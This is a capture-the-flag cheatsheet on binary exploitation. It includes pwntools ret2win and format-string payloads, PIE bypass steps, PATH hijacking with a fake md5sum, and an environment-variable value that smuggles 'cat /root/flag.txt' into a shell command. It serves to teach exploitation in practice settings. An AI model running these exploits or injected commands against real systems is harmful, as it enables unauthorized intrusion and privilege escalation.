# Binary Exploitation — CTF Cheatsheet

---

## 1. First Things to Do

Before anything else, always run these two commands on the binary:

```bash
checksec ./vuln        # shows what protections are enabled
file ./vuln            # tells you if it's 32-bit or 64-bit
strings ./vuln         # look for hints like "flag", "win", "key"
```

---

## 2. Protection Flags — What They Mean

| Flag | What it does | How to deal with it |
|------|-------------|---------------------|
| **PIE** | Randomizes addresses every run | Leak a runtime address, then calculate offset |
| **Full RELRO** | GOT table is read-only | Overwrite return address on stack instead |
| **NX** | Stack is not executable | Can't put shellcode on stack — use ROP |
| **Canary** | Secret value guards return address | Leak canary first via format string |
| **No PIE** | Addresses are always the same | Use function addresses directly from GDB |
| **Partial RELRO** | GOT table is writable | Can overwrite GOT entries to redirect calls |

---

## 3. Buffer Overflow

### Step 1 — Find how many bytes before you overwrite the return address

```python
from pwn import *

# generate a unique pattern of 200 bytes
pattern = cyclic(200)

# run binary in GDB, it will crash
# look at EIP value after crash, then:
offset = cyclic_find(0x62616164)   # paste the crash value here
print(offset)                       # this is your padding size
```

Or in GDB/pwndbg after crash:
```
pattern offset $eip
```

---

### Step 2 — Basic payload (redirect to win function)

**32-bit:**
```python
from pwn import *

elf = ELF("./vuln")
p = process("./vuln")

offset = 44                        # your padding size
win = elf.symbols['win']           # address of win()

payload = b"A" * offset + p32(win)
p.sendline(payload)
p.interactive()
```

**64-bit:**
```python
payload = b"A" * offset + p64(win)
```

---

### Step 3 — Payload with arguments (32-bit only)

When `win()` also checks argument values before printing the flag:

```python
payload  = b"A" * 112           # padding to reach return address
payload += p32(win_addr)         # overwrite return address with win()
payload += b"A" * 4             # fake return address for win() itself
payload += p32(0xCAFEF00D)      # argument 1
payload += p32(0xF00DF00D)      # argument 2
```

> In 32-bit programs, arguments are passed on the stack after the return address.

---

## 4. PIE Bypass — When Addresses Change Every Run

If PIE is enabled, addresses are random. But the **distance between functions stays the same**.

```python
# 1. Program leaks main() address at runtime
main_leak = 0x...   # read from program output

# 2. In GDB locally, find both addresses
# gdb: disas main  →  get main address
# gdb: disas win   →  get win address

# 3. Calculate fixed offset
offset = main_local - win_local

# 4. Apply to leaked address
win_runtime = main_leak - offset

# 5. Send win_runtime to the program
```

---

## 5. Format String Vulnerability

### How to spot it
```c
// VULNERABLE — user input goes directly into printf
printf(buf);

// SAFE — has format specifier
printf("%s", buf);
```

### Leak stack values
```
%p.%p.%p.%p.%p         → prints several stack addresses
%14$p                  → prints value at stack position 14
%14$lx                 → same but in hex (64-bit)
```

### Write to memory (pwntools)
```python
from pwn import *

# auto-find format string offset
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# overwrite target_addr with new_value
payload = fmtstr_payload(offset, {target_addr: new_value}, write_size="short")
```

### Full attack order (when PIE + Full RELRO + Canary are all on)
```
1. Leak main() address using %p
2. Calculate print_flag() address using fixed offset
3. Leak saved stack pointer (rbp) to find return address location
4. Use fmtstr_payload to overwrite return address → point to print_flag()
5. Send "exit" to trigger return → flag prints
```

---

## 6. Heap Overflow

When two variables are `malloc`'d next to each other, overflowing one can overwrite the other.

```
input_data → [pico............] ← 32 bytes
safe_var   → [bico............] ← 32 bytes (right after)
```

To overwrite `safe_var`, send more than 32 bytes to `input_data`:

```bash
# In the challenge menu, choose "Write to buffer"
# Input 33 or more characters
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   # 33 A's
```

Then choose "Print Flag" — `safe_var` is now different, win condition triggers.

---

## 7. Integer Overflow

A 32-bit signed integer can only hold up to **2,147,483,647**.
If you add two large numbers that exceed this, the result wraps around to a negative number.

```
2,147,483,647 + 1 = -2,147,483,648   (overflow!)
```

This can bypass checks like:
```c
if (n1 > n1 + n2)   // normally impossible, but true after overflow
```

**Solution:** send `2147483647` and `1` (or any two large positives that together exceed the max).

---

## 8. PATH Hijacking

When a binary runs a command like `md5sum` without specifying its full path, you can trick it into running your own script instead.

```bash
# 1. Create a fake md5sum that reads the flag
echo '#!/bin/sh' > md5sum
echo 'cat /root/flag.txt' >> md5sum
chmod +x md5sum

# 2. Put current directory at the front of PATH
export PATH=.:$PATH

# 3. Run the vulnerable binary — it runs YOUR md5sum
./flaghasher
```

---

## 9. Environment Variable Injection

When a binary uses an environment variable as part of a shell command, you can inject extra commands into it.

```bash
# Binary runs: ls $SECRET_DIR
# You control SECRET_DIR

export SECRET_DIR="/root; cat /root/flag.txt"
./bin
# ls runs, then your injected command prints the flag
```

---

## 10. Escape Restricted Shell (rbash)

If you log in and see `-rbash`, you are in a restricted shell that blocks some commands.

```bash
# Check if restricted
echo $SHELL       # shows -rbash

# Escape it
sh                # just type sh and press enter
# or
bash --noprofile --norc

# Now you have a full shell — apply PATH hijack as normal
```

---

## 11. GDB Quick Reference

```bash
info functions        # list all functions in the binary
disas win             # disassemble the win() function
b *0x401234           # set breakpoint at address
r                     # run the program
x/20x $esp            # show 20 values on the stack
p $eip                # print the instruction pointer
pattern create 200    # generate cyclic pattern (pwndbg)
pattern offset $eip   # find offset after crash (pwndbg)
```

---

## 12. Vulnerable Functions — Red Flags in Source Code

When you read source code, look for these unsafe functions:

| Function | Why it's dangerous |
|----------|-------------------|
| `gets(buf)` | No size limit — classic overflow |
| `printf(buf)` | No format arg — format string vuln |
| `scanf("%s", buf)` | No size limit |
| `strcpy(dst, src)` | No bounds check |
| `strcat(dst, src)` | Can overflow destination |
| `system(env_var)` | If env var is user-controlled — injection |

---

## 13. Full Attack Flow

```
1. checksec → see what protections are on
2. file + strings → 32 or 64 bit? any hints?
3. read source code → find the vulnerable function
4. find offset → use cyclic pattern in GDB
5. craft payload → padding + address (+ args if needed)
6. test locally → confirm it works
7. send to remote server → get the real flag
```

---

## 14. Common Payloads at a Glance

```python
# Basic ret2win (32-bit)
payload = b"A" * offset + p32(win)

# Basic ret2win (64-bit)
payload = b"A" * offset + p64(win)

# With 2 arguments (32-bit)
payload = b"A" * offset + p32(win) + b"A" * 4 + p32(arg1) + p32(arg2)

# Format string leak
payload = b"%p." * 20

# Format string write
payload = fmtstr_payload(offset, {where: what})
```
